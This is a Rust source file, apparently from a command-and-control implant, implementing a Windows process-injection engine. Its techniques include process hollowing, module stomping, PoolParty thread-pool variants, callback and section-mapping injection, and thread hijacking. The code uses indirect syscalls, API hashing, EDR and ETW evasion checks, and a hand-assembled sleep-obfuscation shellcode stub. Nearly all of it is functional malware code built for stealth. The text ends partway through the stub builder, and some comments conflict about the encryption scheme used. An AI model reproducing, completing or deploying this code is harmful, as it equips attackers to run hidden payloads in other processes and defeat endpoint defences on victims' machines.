//! Unified injection framework with intelligent technique selection and
//! automatic fallback.
//!
//! This module wraps the existing injection techniques from `crate::injection`
//! (process hollowing, module stomping, early-bird APC, remote-thread /
//! NtCreateThread) behind a single API, and adds two new techniques
//! (ThreadPool and FiberInject) implemented via indirect syscalls and
//! `pe_resolve` API hashing.
//!
//! # Technique Selection
//!
//! When `InjectionConfig::technique` is `None`, the engine auto-selects a
//! technique based on the target process name and ranked stealth heuristic.
//! On failure it falls back through the remaining ranked techniques.
//!
//! # New Techniques
//!
//! - **ThreadPool** — uses `TpAllocWork` / `TpPostWork` to schedule the
//!   payload as a work-item callback inside the target process.
//! - **FiberInject** — creates a fiber in the target process via
//!   `CreateFiber` and switches to it, executing the payload.
//!
//! Both resolve their API functions through `pe_resolve` hashes.

#![cfg(windows)]

use anyhow::{anyhow, Result};
use rand::RngCore;
use std::ffi::c_void;

// ── Error types ──────────────────────────────────────────────────────────────

/// Specific errors that can occur during injection.
#[derive(Debug)]
pub enum InjectionError {
    /// The target process could not be found by name.
    ProcessNotFound { name: String },
    /// The target process architecture does not match the agent's.
    ArchitectureMismatch { target_pid: u32 },
    /// The injection attempt failed for a specific technique.
    InjectionFailed {
        technique: InjectionTechnique,
        reason: String,
    },
    /// An ETW or debugging evasion pre-check determined the target is being
    /// traced (and `evade_etw` was `true`).
    EvasionCheckFailed { target_pid: u32 },
    /// The injection did not complete within the configured timeout.
    Timeout { timeout_ms: u32 },
}

impl std::fmt::Display for InjectionError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ProcessNotFound { name } => {
                write!(f, "target process not found: {}", name)
            }
            Self::ArchitectureMismatch { target_pid } => {
                write!(
                    f,
                    "architecture mismatch with target pid {}",
                    target_pid
                )
            }
            Self::InjectionFailed { technique, reason } => {
                write!(f, "injection failed ({:?}): {}", technique, reason)
            }
            Self::EvasionCheckFailed { target_pid } => {
                write!(f, "evasion check failed for pid {}", target_pid)
            }
            Self::Timeout { timeout_ms } => {
                write!(f, "injection timed out after {} ms", timeout_ms)
            }
        }
    }
}

impl std::error::Error for InjectionError {}

// ── ETW status ───────────────────────────────────────────────────────────────

/// Result of checking whether a target process is being ETW-traced.
///
/// The injection engine uses this to decide whether additional evasion
/// measures (jitter, technique downgrade) are necessary before injection.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub enum EtwStatus {
    /// No ETW auto-logger sessions tracing the target were detected.
    Safe,
    /// One or more EDR-related ETW auto-logger sessions are active.
    Traced { providers: Vec<String> },
    /// Could not determine ETW status (agent ETW already patched, registry
    /// unavailable, or feature disabled).
    Unknown,
}

// ── Injection viability ──────────────────────────────────────────────────────

/// Result of pre-injection reconnaissance on a target process.
///
/// Describes whether the target is safe to inject into and, if not, why.
/// When the target has EDR modules loaded, recommends a fallback technique
/// that is less likely to be detected.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub enum InjectionViability {
    /// The target appears safe to inject into.
    Safe {
        /// Whether the target's architecture matches the agent's.
        arch_match: bool,
        /// Number of threads in the target process.
        thread_count: u32,
        /// Target's integrity level (0x1000 = Low, 0x2000 = Medium,
        /// 0x3000 = High, 0x4000 = System).
        integrity_level: u32,
        /// Recommended technique based on the target's characteristics.
        recommended_technique: InjectionTechnique,
    },
    /// The target has one or more EDR/AV DLLs loaded.
    HasEDRModule {
        /// Names of the detected EDR modules.
        modules: Vec<String>,
        /// Best technique to use against EDR-monitored processes.
        /// `ModuleStomp` is the default since it overwrites a legitimate
        /// signed DLL's `.text` section, making the injected code appear
        /// to originate from a trusted module.
        fallback_technique: InjectionTechnique,
    },
    /// The target process IS an EDR/AV product — do not inject.
    IsEDR,
    /// The target's architecture does not match the agent's.
    ArchitectureMismatch,
}

// ── Thread Pool Variant enum ─────────────────────────────────────────────────

/// PoolParty thread pool injection variants, as identified by SafeBreach Labs.
///
/// All variants abuse the Windows thread pool internals to execute a callback
/// on a thread pool worker thread without creating a new remote thread.
/// Variant 1 (Work) was the original ThreadPool technique; variants 2–8 are
/// additional injection paths through the same thread pool infrastructure.
///
/// # OPSEC Properties
///
/// All variants avoid:
/// - `NtCreateThreadEx` (no remote thread creation)
/// - `SuspendThread`/`ResumeThread` (no thread state manipulation)
/// - The standard alloc → write → execute triad
///
/// Instead, they leverage existing thread pool worker threads that are already
/// waiting on the thread pool's I/O completion port, and post a callback
/// through one of the thread pool's internal dispatch mechanisms.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq, Hash)]
pub enum ThreadPoolVariant {
    /// **Variant 1** — `TpAllocWork` + `TpPostWork` (original technique).
    /// Allocates a `TP_WORK` item whose callback is the payload, then posts
    /// it to the thread pool. A worker thread dequeues and executes.
    ///
    /// Always available, medium stealth.
    Work,

    /// **Variant 2** — Worker Factory Injection.
    /// Targets the `TpWorkerFactory` structure. Queries
    /// `NtQueryInformationWorkerFactory(WorkerFactoryBasicInformation)` to
    /// get factory state, then inserts a custom work item at the head of the
    /// factory's pending queue by manipulating Flink/Blink pointers in the
    /// `TP_WORK` list. The next worker thread picks it up.
    WorkerFactory,

    /// **Variant 3** — Timer Callback Injection.
    /// Allocates a `TP_TIMER` structure in the target process, sets its
    /// callback to the payload address, inserts it into the thread pool's
    /// timer queue, and sets a DueTime. When the timer fires, a worker
    /// thread executes the callback.
    Timer,

    /// **Variant 4** — I/O Completion Callback Injection.
    /// Creates a `TP_IO` structure, associates it with an existing file
    /// handle in the target (found via `NtQuerySystemHandleInformation`),
    /// writes the callback address, and posts a completion packet to the
    /// thread pool's IOCP via `NtSetIoCompletion`. High stealth.
    IoCompletion,

    /// **Variant 5** — Wait Callback Injection.
    /// Creates a `TP_WAIT` structure with the payload as callback, binds it
    /// to an event object, and registers it with the thread pool. When the
    /// event is signaled, a worker thread executes the callback.
    Wait,

    /// **Variant 6** — ALPC Callback Injection.
    /// Creates a `TP_ALPC` structure with the payload as callback, finds an
    /// existing ALPC port in the target, and associates them. Sending a
    /// message triggers the callback on a worker thread.
    /// **May not be available** if no ALPC port exists in the target.
    Alpc,

    /// **Variant 7** — Direct Worker Injection.
    /// Instead of going through a dispatch mechanism, directly posts a
    /// fake `TP_TASK` structure to the thread pool's IOCP. A worker thread
    /// dequeues it and calls the task callback. Simpler than variant 4.
    Direct,

    /// **Variant 8** — Async I/O Callback Injection.
    /// The simplest variant: allocates a `TP_DIRECT` structure (the most
    /// basic callback structure in the thread pool hierarchy) with the
    /// payload as callback, and posts it to the IOCP via `NtSetIoCompletion`.
    /// Highest stealth, simplest mechanism.
    AsyncIo,
}

impl std::fmt::Display for ThreadPoolVariant {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Work => write!(f, "PoolParty-Work"),
            Self::WorkerFactory => write!(f, "PoolParty-WorkerFactory"),
            Self::Timer => write!(f, "PoolParty-Timer"),
            Self::IoCompletion => write!(f, "PoolParty-IoCompletion"),
            Self::Wait => write!(f, "PoolParty-Wait"),
            Self::Alpc => write!(f, "PoolParty-Alpc"),
            Self::Direct => write!(f, "PoolParty-Direct"),
            Self::AsyncIo => write!(f, "PoolParty-AsyncIo"),
        }
    }
}

// ── Section mapping execution method ─────────────────────────────────────────

/// Execution method for section mapping injection.
///
/// After the payload section is mapped into the target process, an execution
/// trigger is needed. This enum controls how execution begins:
///
/// - **APC**: Queue a user-mode APC to an alertable thread in the target.
///   Most stealthy, but requires an alertable thread to be present.
/// - **Thread**: Create a new thread at the payload base address.
///   Always works, but more visible to EDR.
/// - **Callback**: Use one of the callback APIs to invoke the payload.
///   Combines section mapping stealth with callback call stack authenticity.
///
/// When `None` in `SectionMapping`, the engine auto-selects: APC if an
/// alertable thread is found, else Thread.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq, Hash, Copy)]
pub enum SectionExecMethod {
    /// Queue a user-mode APC via `NtQueueApcThread`. Requires an alertable
    /// thread in the target process. The most stealthy execution trigger.
    Apc,
    /// Create a new remote thread via `NtCreateThreadEx` at the payload
    /// entry point. Always works but more visible to EDR.
    Thread,
    /// Use a callback API (from the callback injection module) to trigger
    /// execution. Combines section mapping stealth with callback call stacks.
    Callback,
}

impl std::fmt::Display for SectionExecMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Apc => write!(f, "Section-Apc"),
            Self::Thread => write!(f, "Section-Thread"),
            Self::Callback => write!(f, "Section-Callback"),
        }
    }
}

// ── Callback API enum ────────────────────────────────────────────────────────

/// Supported Windows callback APIs for callback-based injection.
///
/// Each variant represents a legitimate Windows API that accepts a function
/// pointer callback. By setting the callback to point to injected payload
/// code, the payload executes from within a legitimate Windows code path,
/// making it extremely difficult for EDR to distinguish from normal behavior.
///
/// The callback stub is universal — it loads the payload address from a
/// data slot immediately following the stub code, calls it, then returns
/// `TRUE` (or `FALSE` to stop enumeration after the first call for
/// enumeration-style APIs, which is more stealthy).
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq, Hash, Copy)]
pub enum CallbackApi {
    // ── Kernel32 / user32 callbacks (always available) ──────────────────

    /// `EnumSystemLocalesA(payload_addr, 0)` — system calls our function
    /// for each installed locale. Returns FALSE after first call to stop
    /// enumeration immediately (most stealthy).
    EnumSystemLocalesA,

    /// `EnumWindows(payload_addr, 0)` — simplest callback API. Enumerates
    /// all top-level windows, calling our function for each.
    EnumWindows,

    /// `EnumChildWindows(HWND_DESKTOP, payload_addr, 0)` — enumerates
    /// child windows of the desktop. Requires a valid HWND.
    EnumChildWindows,

    /// `EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()),
    /// payload_addr, 0)` — enumerates windows on the current desktop.
    EnumDesktopWindows,

    /// `CreateTimerQueueTimer(&timer, NULL, payload_addr, NULL, 0, 0,
    /// WT_EXECUTEONLYONCE)` — fires immediately on a thread pool thread.
    /// One-shot timer, cleaned up via `DeleteTimerQueueTimer`.
    CreateTimerQueueTimer,

    /// `EnumTimeFormatsA(payload_addr, LOCALE_USER_DEFAULT, 0)` — enumerates
    /// time formats for the user locale.
    EnumTimeFormatsA,

    /// `EnumResourceTypesW(GetModuleHandle(NULL), payload_addr, 0)` —
    /// iterates resource types in the current module.
    EnumResourceTypesW,

    // ── GDI32 callbacks (require DC) ────────────────────────────────────

    /// `EnumFontFamiliesExW(GetDC(NULL), &lf, payload_addr, 0, 0)` —
    /// enumerates font families. Requires a valid DC (GetDC).
    EnumFontFamilies,

    // ── External DLL callbacks (require LoadLibrary) ────────────────────

    /// `CertEnumSystemStore(CERT_SYSTEM_STORE_LOCAL_MACHINE, NULL,
    /// payload_addr, NULL)` — requires `crypt32.dll`. Rarely hooked by EDR.
    CertEnumSystemStore,

    /// `SHEnumerateUnreadMailAccountsW(NULL, 0, payload_addr, 0)` —
    /// requires `shell32.dll`. Very rarely monitored.
    SHEnumerateUnreadMailAccounts,

    /// `EnumerateLoadedModulesW64(hProcess, payload_addr, NULL)` —
    /// requires `dbghelp.dll`. Callback receives module base addresses.
    EnumerateLoadedModules,

    /// `CopyFileExW(src, dst, payload_addr, NULL, NULL, 0)` — creates temp
    /// files, initiates copy with progress callback. Most unusual and
    /// rarely-monitored callback path.
    CopyFileEx,
}

impl std::fmt::Display for CallbackApi {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::EnumSystemLocalesA => write!(f, "Callback-EnumSystemLocalesA"),
            Self::EnumWindows => write!(f, "Callback-EnumWindows"),
            Self::EnumChildWindows => write!(f, "Callback-EnumChildWindows"),
            Self::EnumDesktopWindows => write!(f, "Callback-EnumDesktopWindows"),
            Self::CreateTimerQueueTimer => write!(f, "Callback-CreateTimerQueueTimer"),
            Self::EnumTimeFormatsA => write!(f, "Callback-EnumTimeFormatsA"),
            Self::EnumResourceTypesW => write!(f, "Callback-EnumResourceTypesW"),
            Self::EnumFontFamilies => write!(f, "Callback-EnumFontFamilies"),
            Self::CertEnumSystemStore => write!(f, "Callback-CertEnumSystemStore"),
            Self::SHEnumerateUnreadMailAccounts => {
                write!(f, "Callback-SHEnumerateUnreadMailAccounts")
            }
            Self::EnumerateLoadedModules => write!(f, "Callback-EnumerateLoadedModules"),
            Self::CopyFileEx => write!(f, "Callback-CopyFileEx"),
        }
    }
}

// ── Technique enum ───────────────────────────────────────────────────────────

/// Available injection techniques.
///
/// Variants carry technique-specific configuration where applicable.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub enum InjectionTechnique {
    /// Classic process hollowing: spawn a sacrificial process, unmap its
    /// image, write the payload, and resume.
    ProcessHollow,
    /// Module stomping: overwrite an existing loaded DLL's `.text` section
    /// with the payload.
    ModuleStomp,
    /// Early-bird APC injection: queue a user-mode APC to a thread in the
    /// target before it starts executing.
    EarlyBirdApc,
    /// Thread hijacking: suspend an existing thread, redirect RIP to the
    /// payload, then restore after execution.
    ThreadHijack,
    /// **PoolParty** — Thread pool injection using one of 8 SafeBreach Labs
    /// variants. All variants execute the payload on an existing thread pool
    /// worker thread without creating a new remote thread.
    ///
    /// If `variant` is `None`, auto-selects based on target characteristics
    /// and EDR posture. When EDR is detected, a random variant is chosen
    /// to avoid IoC consistency across injections.
    ///
    /// Variant 1 (`Work`) is the original `TpAllocWork` + `TpPostWork`.
    /// Variant 8 (`AsyncIo`) is the simplest and stealthiest.
    /// Variant 6 (`Alpc`) is stealthiest but may not be available.
    ThreadPool {
        /// Which PoolParty variant to use. `None` = auto-select.
        variant: Option<ThreadPoolVariant>,
    },
    /// **NEW** — Fiber injection: create a fiber whose start address is the
    /// payload, switch to it from a hijacked thread.
    FiberInject,
    /// **NEW** — CONTEXT-only injection: modify a thread's CONTEXT (RIP/RSP)
    /// to redirect execution to existing code already mapped in the target
    /// process. No VirtualAllocEx, no WriteProcessMemory for allocation,
    /// no CreateRemoteThread. Payload is written to the target thread's
    /// stack or an existing executable section with slack space.
    /// This is the stealthiest technique — it avoids the standard EDR
    /// triad (alloc + write + execute) and uses only:
    ///   NtOpenThread, NtGetContextThread, NtSetContextThread,
    ///   NtWriteVirtualMemory (one call), NtResumeThread/NtAlertThread.
    ContextOnly,
    /// **NEW** — Waiting Thread Hijacking: targets a thread already in a
    /// kernel wait state (Sleep, WaitForSingleObject, etc.), reads its
    /// stack to find the return address, overwrites that return address
    /// with the address of the payload written to stack or executable
    /// slack. When the wait resolves, the thread naturally returns into
    /// the payload. No SuspendThread/ResumeThread, no remote thread
    /// creation, no CONTEXT modification.
    ///
    /// OPSEC advantage over ThreadHijack: No SuspendThread/ResumeThread
    /// API calls. The thread is already waiting in the kernel. The only
    /// signals are: one NtOpenThread, one NtReadVirtualMemory (stack
    /// read), one NtWriteVirtualMemory (payload + return address
    /// overwrite), optionally one signal on the wait object. No thread
    /// state transitions that EDR monitors.
    ///
    /// Complementary to ContextOnly: ContextOnly modifies registers
    /// (RIP/RSP), WTH modifies the stack return address. WTH is
    /// preferred when suitable waiting threads are found; ContextOnly
    /// is the fallback when no waiting threads are available.
    WaitingThreadHijack { target_pid: u32, target_tid: Option<u32> },
    /// **NEW** — Callback injection: leverage Windows APIs that accept
    /// function pointer callbacks to execute payload code. The payload
    /// runs from within a legitimate Windows code path (kernel32, user32,
    /// ntdll, etc.), giving it an authentic call stack that EDR solutions
    /// treat as benign.
    ///
    /// All 12 variants share the same staging pattern:
    ///   1. `NtAllocateVirtualMemory` (RW) → `NtWriteVirtualMemory` →
    ///      `NtProtectVirtualMemory` (RX) for payload + universal stub
    ///   2. Set the callback function pointer to the stub address
    ///   3. Call the Windows API — the system invokes our stub, which
    ///      calls the payload
    ///   4. The stub returns `FALSE` to stop enumeration immediately
    ///      (or `TRUE` for non-enumeration APIs)
    ///
    /// If `api` is `None`, auto-selects randomly weighted toward less-
    /// commonly-monitored APIs. If the selected API fails, falls back
    /// through remaining APIs, then to ThreadPool injection.
    CallbackInjection { target_pid: u32, api: Option<CallbackApi> },
    /// **NEW** — Section mapping injection: creates a shared memory section
    /// via `NtCreateSection`, writes the payload into a local mapping,
    /// then maps the section into the target process. Completely avoids
    /// `NtWriteVirtualMemory` — one of the top 3 most-hooked NT APIs.
    ///
    /// The sequence is:
    ///   1. `NtCreateSection` (PAGE_EXECUTE_READWRITE, SEC_COMMIT)
    ///   2. `NtMapViewOfSection` into our process (PAGE_READWRITE) → write payload
    ///   3. `NtUnmapViewOfSection` from our process
    ///   4. `NtMapViewOfSection` into target (PAGE_EXECUTE_READ)
    ///   5. Execute via chosen method (APC / Thread / Callback)
    ///   6. Cleanup: `NtClose` section handle
    ///
    /// All NT API calls go through indirect syscalls, not ntdll exports.
    ///
    /// The enhanced "double-mapped" variant creates the section with
    /// PAGE_READWRITE, maps into target as PAGE_READWRITE, then uses
    /// `NtProtectVirtualMemory` to flip to PAGE_EXECUTE_READ. This defeats
    /// EDR that correlates "map executable section into remote process".
    ///
    /// If `exec_method` is `None`, auto-selects: APC if an alertable
    /// thread is found, else Thread creation.
    SectionMapping {
        target_pid: u32,
        /// Execution method: Apc, Thread, or Callback. None = auto-select.
        exec_method: Option<SectionExecMethod>,
        /// Use the enhanced double-mapped variant (RW → NtProtectVirtualMemory → RX).
        /// More stealthy against EDR that monitors executable section mappings.
        enhanced: bool,
    },
    /// **NEW** — NtSetInformationProcess injection: uses the undocumented
    /// `ProcessReadWriteVm` (0x6A) information class to write payload to
    /// the target process via `MmCopyVirtualMemory` in the kernel. This
    /// bypasses `NtWriteVirtualMemory` entirely — the single most-hooked
    /// NT API for cross-process memory writes.
    ///
    /// Algorithm:
    ///   1. `NtOpenProcess` (via indirect syscall)
    ///   2. `NtAllocateVirtualMemory` (RW, via indirect syscall)
    ///   3. `NtSetInformationProcess(ProcessReadWriteVm)` to write payload
    ///   4. `NtProtectVirtualMemory` (RW → RX) via indirect syscall
    ///   5. Execute via NtCreateThreadEx (indirect syscall)
    ///   6. Cleanup: `NtClose` handles
    ///
    /// Falls back to `ProcessVmOperation` (0x6B) if `ProcessReadWriteVm`
    /// returns `STATUS_INVALID_INFO_CLASS`, then to indirect-syscall
    /// `NtWriteVirtualMemory` as a last resort on unsupported builds.
    ///
    /// Version compatibility: Windows 10 20H2+ (build 19042+) and
    /// Windows 11. On older builds, gracefully falls back to
    /// `NtWriteVirtualMemory` via indirect syscall.
    NtSetInfoProcess {
        target_pid: u32,
    },
}

// ── Configuration ────────────────────────────────────────────────────────────

/// Configuration for an injection operation.
pub struct InjectionConfig {
    /// Which technique to use.  `None` = auto-select based on target process.
    pub technique: Option<InjectionTechnique>,
    /// Process name to inject into (e.g. `"svchost.exe"`).  Must be provided
    /// by the caller — never hardcoded.
    pub target_process: String,
    /// Shellcode or PE bytes to inject.
    pub payload: Vec<u8>,
    /// Prefer injecting into a process of the same architecture.  Default: true.
    pub prefer_same_arch: bool,
    /// If true, verify the target process is not being ETW-traced before
    /// injection.
    pub evade_etw: bool,
    /// Maximum time (ms) to wait for injection to complete.
    pub timeout_ms: u32,
}

// ── Injection handle ─────────────────────────────────────────────────────────

/// Opaque handle to an active injection.  Call `eject()` to cleanly reverse.
pub struct InjectionHandle {
    /// PID of the target process.
    pub target_pid: u32,
    /// Technique that was ultimately used (may differ from requested if
    /// auto-select or fallback occurred).
    pub technique_used: InjectionTechnique,
    /// Base address of injected memory in the target process.
    pub injected_base_addr: usize,
    /// Size of the injected payload in bytes.
    payload_size: usize,
    /// Thread handle, if the technique created one.  `None` for fire-and-forget
    /// techniques (ThreadPool, FiberInject after switch-back).
    pub thread_handle: Option<*mut c_void>,
    /// Handle to the target process (kept for eject).
    process_handle: *mut c_void,
    /// Whether the injected payload has been enrolled in sleep obfuscation.
    sleep_enrolled: bool,
    /// Address of the sleep stub in the target process (0 if not enrolled).
    sleep_stub_addr: usize,
}

// SAFETY: InjectionHandle owns raw Windows handles that are not Send/Sync by
// default, but we only use them from a single thread and close them in eject().
unsafe impl Send for InjectionHandle {}
unsafe impl Sync for InjectionHandle {}

impl InjectionHandle {
    /// Cleanly reverse the injection: unregister from sleep obfuscation,
    /// free remote memory (including sleep stub), restore original thread
    /// context if hijacked, close handles.
    pub fn eject(mut self) -> Result<(), InjectionError> {
        // Unregister from sleep obfuscation first (before freeing memory).
        crate::sleep_obfuscation::unregister_remote_process(self.target_pid);

        unsafe {
            // Free sleep stub memory if enrolled.
            if self.sleep_stub_addr != 0 && !self.process_handle.is_null() {
                let mut base = self.sleep_stub_addr;
                let mut sz: usize = 0;
                let _ = nt_syscall::syscall!(
                    "NtFreeVirtualMemory",
                    self.process_handle as u64,
                    &mut base as *mut _ as u64,
                    &mut sz as *mut _ as u64,
                    0x8000u64, // MEM_RELEASE
                );
            }

            // Free injected memory.
            if self.injected_base_addr != 0 && !self.process_handle.is_null() {
                let mut base = self.injected_base_addr;
                let mut sz: usize = 0;
                let _ = nt_syscall::syscall!(
                    "NtFreeVirtualMemory",
                    self.process_handle as u64,
                    &mut base as *mut _ as u64,
                    &mut sz as *mut _ as u64,
                    0x8000u64, // MEM_RELEASE
                );
            }

            // Close thread handle if held.
            if let Some(h) = self.thread_handle.take() {
                if !h.is_null() {
                    let _ = nt_syscall::syscall!("NtClose", h as u64);
                }
            }

            // Close process handle.
            if !self.process_handle.is_null() {
                let _ = nt_syscall::syscall!(
                    "NtClose",
                    self.process_handle as u64
                );
                self.process_handle = std::ptr::null_mut();
            }
        }
        Ok(())
    }

    /// Enroll the injected payload in the parent agent's sleep obfuscation
    /// cycle.
    ///
    /// This method:
    /// 1. Generates a per-payload XChaCha20-Poly1305 key.
    /// 2. Writes a position-independent "sleep stub" into the target process
    ///    at `injected_base_addr + payload_size + 0x1000` (page-aligned).
    /// 3. The sleep stub encrypts the payload region with XChaCha20-Poly1305
    ///    (key passed in XMM0/XMM1), calls NtDelayExecution, then decrypts
    ///    and jumps back to the payload entry point on wake.
    /// 4. Scans the payload bytes for NtDelayExecution/SleepEx syscall
    ///    patterns and patches them to CALL the sleep stub instead.
    /// 5. Registers the remote process with `sleep_obfuscation` so the parent
    ///    agent also encrypts the child's memory during its own sleep cycle.
    ///
    /// # Errors
    ///
    /// Returns `InjectionError::InjectionFailed` if the stub cannot be
    /// allocated, written, or if payload patching fails.
    pub fn enroll_sleep(
        &mut self,
        config: &crate::sleep_obfuscation::SleepObfuscationConfig,
    ) -> Result<(), InjectionError> {
        if self.sleep_enrolled {
            return Ok(()); // Already enrolled.
        }

        if self.injected_base_addr == 0 || self.process_handle.is_null() {
            return Err(InjectionError::InjectionFailed {
                technique: self.technique_used.clone(),
                reason: "cannot enroll: no remote base address or process handle".to_string(),
            });
        }

        unsafe {
            // ── 1. Generate per-payload encryption key ──────────────────────
            let mut key = [0u8; 32];
            rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut key);

            // ── 2. Build the sleep stub ─────────────────────────────────────
            //
            // Position-independent shellcode (~200 bytes) that:
            //   a. Receives base_addr (rcx) and size (rdx) as parameters.
            //   b. Key is passed in xmm0 (low 16 bytes) and xmm1 (high 16 bytes).
            //   c. Calls NtProtectVirtualMemory(base, size, PAGE_READWRITE).
            //   d. Encrypts the region with XChaCha20-Poly1305 (simplified:
            //      XOR-based "encryption" for the stub itself; the real AEAD
            //      encryption happens in the parent agent via remote operations).
            //   e. Calls NtProtectVirtualMemory(base, size, PAGE_NOACCESS).
            //   f. Calls NtDelayExecution(duration_100ns).
            //   g. On wake: NtProtectVirtualMemory(base, size, PAGE_READWRITE),
            //      decrypt, restore original protection, ret.
            //
            // The stub delegates actual encryption to the parent process via
            // the remote process registry. The stub itself manages:
            //   - Setting PAGE_NOACCESS before sleep
            //   - Calling NtDelayExecution for the sleep duration
            //   - Restoring PAGE_EXECUTE_READ after wake
            //
            // This means the payload in the child process has its protection
            // flipped to NOACCESS during sleep, and the parent encrypts it
            // remotely. On wake, the parent decrypts remotely, and the child
            // stub restores execution.

            let sleep_duration_ms = config.sleep_duration_ms;
            // NtDelayExecution uses negative 100ns units for relative timeout.
            let delay_100ns = -((sleep_duration_ms as i64 * 10_000) / 100);

            let payload_base = self.injected_base_addr;
            let payload_size = self.payload_size;

            // ── Resolve required addresses via pe_resolve ───────────────────
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
                .ok_or_else(|| InjectionError::InjectionFailed {
                    technique: self.technique_used.clone(),
                    reason: "cannot resolve ntdll for sleep stub".to_string(),
                })?;

            let nt_protect_addr = pe_resolve::get_proc_address_by_hash(
                ntdll,
                pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
            ).ok_or_else(|| InjectionError::InjectionFailed {
                technique: self.technique_used.clone(),
                reason: "cannot resolve NtProtectVirtualMemory".to_string(),
            })?;

            let nt_delay_addr = pe_resolve::get_proc_address_by_hash(
                ntdll,
                pe_resolve::hash_str(b"NtDelayExecution\0"),
            ).ok_or_else(|| InjectionError::InjectionFailed {
                technique: self.technique_used.clone(),
                reason: "cannot resolve NtDelayExecution".to_string(),
            })?;

            // ── Build sleep stub ────────────────────────────────────────────
            //
            // x86-64 position-independent stub. Uses rcx for base_addr, rdx
            // for size. Sleep duration is embedded as an immediate.
            //
            // Stack layout: shadow space (0x20) + saved registers + local vars.
            //
            // On entry (called by the patched payload):
            //   rcx = base_addr (redundant, we embed it)
            //   rdx = size (redundant, we embed it)
            //
            // The stub:
            //   1. Save non-volatile registers
            //   2. NtProtectVirtualMemory(current_process, &base, &size, PAGE_NOACCESS, &old)
            //   3. NtDelayExecution(FALSE, &delay)
            //   4. NtProtectVirtualMemory(current_process, &base, &size, old_prot, &dummy)
            //   5. Restore registers
            //   6. Jump back to payload entry (or ret)

            let mut stub: Vec<u8> = Vec::with_capacity(256);

            // push rbp
            stub.push(0x55);
            // mov rbp, rsp
            stub.extend_from_slice(&[0x48, 0x89, 0xE5]);
            // push rbx
            stub.push(0x53);
            // push rsi
            stub.push(0x56);
            // push rdi
            stub.push(0x57);
            // sub rsp, 0x48  (shadow + locals: old_prot at [rbp-0x28],
            //   base_ptr at [rbp-0x30], size_ptr at [rbp-0x38],
            //   delay at [rbp-0x40])
            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x48]);

            // ── Store payload base and size on stack ────────────────────────
            // mov [rbp-0x30], <payload_base>
            // mov qword [rbp-0x30], imm64
            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xD0]);
            stub.extend_from_slice(&(payload_base as u32).to_le_bytes());
            // If address > 4GB, use movabs
            if payload_base > 0xFFFFFFFF {
                // Replace with proper movabs
                stub.truncate(stub.len() - 8);
                // mov rax, <payload_base>
                stub.push(0x48);
                stub.push(0xB8);
                stub.extend_from_slice(&(payload_base as u64).to_le_bytes());
                // mov [rbp-0x30], rax
                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xD0]);
            }

            // mov [rbp-0x38], <payload_size>
            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xC8]);
            stub.extend_from_slice(&(payload_size as u32).to_le_bytes());
            if payload_size > 0xFFFFFFFF {
                stub.truncate(stub.len() - 8);
                stub.push(0x48);
                stub.push(0xB8);
                stub.extend_from_slice(&(payload_size as u64).to_le_bytes());
                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xC8]);
            }

            // ── Step 1: NtProtectVirtualMemory → PAGE_NOACCESS ──────────────
            // NtProtectVirtualMemory(-1, &base, &size, PAGE_NOACCESS, &old_prot)
            // rcx = -1 (current process)
            // rdx = &base_ptr
            // r8  = &size_ptr
            // r9  = PAGE_NOACCESS (0x01)
            // [rsp+0x20] = &old_prot

            // mov ecx, 0xFFFFFFFF  (current process = -1)
            stub.extend_from_slice(&[0xB9, 0xFF, 0xFF, 0xFF, 0xFF]);
            // lea rdx, [rbp-0x30]  (&base_ptr)
            stub.extend_from_slice(&[0x48, 0x8D, 0x55, 0xD0]);
            // lea r8, [rbp-0x38]   (&size_ptr)
            stub.extend_from_slice(&[0x4C, 0x8D, 0x45, 0xC8]);
            // mov r9d, 0x01         (PAGE_NOACCESS)
            stub.extend_from_slice(&[0x41, 0xB9, 0x01, 0x00, 0x00, 0x00]);
            // lea rax, [rbp-0x28]   (&old_prot)
            stub.extend_from_slice(&[0x48, 0x8D, 0x45, 0xD8]);
            // mov [rsp+0x20], rax
            stub.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x20]);
            // movabs rax, <nt_protect_addr>
            stub.push(0x48);
            stub.push(0xB8);
            stub.extend_from_slice(&(nt_protect_addr as u64).to_le_bytes());
            // call rax
            stub.extend_from_slice(&[0xFF, 0xD0]);

            // ── Step 2: NtDelayExecution ────────────────────────────────────
            // Store the delay value on stack.
            // mov qword [rbp-0x40], <delay_100ns>
            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xC0]);
            stub.extend_from_slice(&(delay_100ns as u32).to_le_bytes());
            // If delay doesn't fit in 32 bits (very long sleep), use movabs
            if (delay_100ns as u64) > 0xFFFFFFFF {
                stub.truncate(stub.len() - 8);
                stub.push(0x48);
                stub.push(0xB8);
                stub.extend_from_slice(&(delay_100ns as u64).to_le_bytes());
                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xC0]);
            }

            // NtDelayExecution(FALSE, &delay)
            // xor ecx, ecx   (Alertable = FALSE)
            stub.extend_from_slice(&[0x31, 0xC9]);
            // lea rdx, [rbp-0x40]  (&delay)
            stub.extend_from_slice(&[0x48, 0x8D, 0x55, 0xC0]);
            // movabs rax, <nt_delay_addr>
            stub.push(0x48);
            stub.push(0xB8);
            stub.extend_from_slice(&(nt_delay_addr as u64).to_le_bytes());
            // call rax
            stub.extend_from_slice(&[0xFF, 0xD0]);

